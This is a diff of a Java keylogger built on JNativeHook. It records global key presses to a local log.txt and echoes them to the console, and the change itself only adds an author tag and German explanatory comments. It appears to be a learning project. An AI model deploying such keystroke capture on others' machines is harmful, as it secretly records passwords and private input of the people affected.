@@ -1,5 +1,7 @@
 package main;
-
+/**
+ * @author Lear Sokoli
+ */
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
@@ -13,7 +15,9 @@ import java.io.IOException;
 
 
 public class Main implements NativeKeyListener {
-    private static FileWriter writer;
+    private static FileWriter writer; /** 
+    * Hier wird das Writer Objekt erzeugt.
+    */
     
 	public static void main(String[] args) {
 		String text = "Input";
@@ -28,7 +32,10 @@ public class Main implements NativeKeyListener {
 			// Get the logger for "org.jnativehook" and set the level to off.
 			Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
 			logger.setLevel(Level.OFF);
-
+			/**
+			 * Logger wird nicht die Maus Bewegung zeigen!!
+			 * 
+			 */
 			// Don't forget to disable the parent handlers.
 			logger.setUseParentHandlers(false);
 			
@@ -36,9 +43,16 @@ public class Main implements NativeKeyListener {
 			// FileWriter w;
 				try {
 					writer = new FileWriter("log.txt");
-
+					/**
+					 * im log.txt werden die Eingabe von tastatur gespeichert.
+					 * log.txt befindet sich im Ordner des Projektes
+					 */
+					
 				} catch (IOException e1) {
-					System.out.println("Problem bei FileWriter");
+					System.out.println("Problem bei FileWriter"); /**
+					*
+					*@throws Zeigt dass, ein Problem mit dem FileWriter gibt.
+					**/
 				} 
 			
 	}
@@ -47,6 +61,12 @@ public class Main implements NativeKeyListener {
 	public void nativeKeyPressed(NativeKeyEvent e) {
 	    String text = NativeKeyEvent.getKeyText(e.getKeyCode());
 		System.out.println("Pressed: " + text );
+		/**
+		 * text wird die Eingabe gespeichert. Nur weil Text eine String datei sit, kann ich 
+		 * das im Writer schreiben, write(); funktion
+		 * @return Die Eingabe der Tastatur
+		 */
+		
 		try {
 			writer.write(text);
 		} catch (IOException e1) {
